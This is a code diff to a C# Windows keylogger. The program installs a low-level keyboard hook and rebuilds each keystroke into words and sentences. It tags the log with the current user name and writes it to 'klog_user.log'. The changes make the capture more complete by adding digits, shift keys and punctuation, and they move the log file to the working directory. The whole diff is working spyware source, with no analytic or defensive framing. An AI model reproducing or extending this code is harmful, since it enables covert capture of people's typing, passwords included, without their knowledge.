@@ -20,7 +20,7 @@ namespace KeyLogger
         private static List<string> sentence = new List<string>();
 
         public static string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-        public static string logFile = Path.Combine($"C:\\Users\\hrakh\\Desktop", "log_new.log");
+        public static string logFile = Path.Combine(Environment.CurrentDirectory, $"klog_user.log");
         [DllImport("user32.dll")]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -34,7 +34,7 @@ namespace KeyLogger
         private static extern IntPtr GetModuleHandle(String lpModuleName);
 
         [DllImport("user32.dll")]
-        static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);
+        static extern short GetAsyncKeyState(Keys vKey);
 
         private delegate IntPtr hookProcedure(int ncode, IntPtr wParam, IntPtr lParam);
         static void WriteResult(string line)
@@ -71,16 +71,55 @@ namespace KeyLogger
                         word = new StringBuilder();
                         break;
                     case Keys.Enter:
-                    case Keys.OemPeriod:   
+                    case Keys.OemPeriod:
+                        sentence.Add(word.ToString());
                         WriteResult(String.Join(" ", sentence));
                         sentence = new List<string>();
+                        word = new StringBuilder();
                         break;
                     case Keys.Oemcomma:
                         word.Append(",");
                         sentence.Add(word.ToString());
                         word = new StringBuilder();
                         break;
+                     case Keys.OemQuestion:
+                        word.Append("?");
+                        sentence.Add(word.ToString());
+                        word = new StringBuilder();
+                        break;
                     case Keys.Capital:
+                    case Keys.LShiftKey:
+                    case Keys.RShiftKey:
+                        break;
+                    case Keys.D0:
+                        word.Append("0");
+                        break;
+                    case Keys.D1:
+                        word.Append("1");
+                        break;
+                    case Keys.D2:
+                        word.Append("2");
+                        break;
+                    case Keys.D3:
+                        word.Append("3");
+                        break;
+                    case Keys.D4:
+                        word.Append("4");
+                        break;
+                    case Keys.D5:
+                        word.Append("5");
+                        break;
+                    case Keys.D6:
+                        word.Append("6");
+                        break;
+                    case Keys.D7:
+                        word.Append("7");
+                        break;
+                    case Keys.D8:
+                        word.Append("8");
+                        break;
+                    case Keys.D9:
+                        word.Append("9");
                         break;
                     default:
                         word.Append(key);
@@ -92,6 +131,7 @@ namespace KeyLogger
         }
         static void Main(String[] args)
         {
+            
             hookProcedure callback = Callback;
             var module = Process.GetCurrentProcess().MainModule.ModuleName;
             var moduleHandle = GetModuleHandle(module);
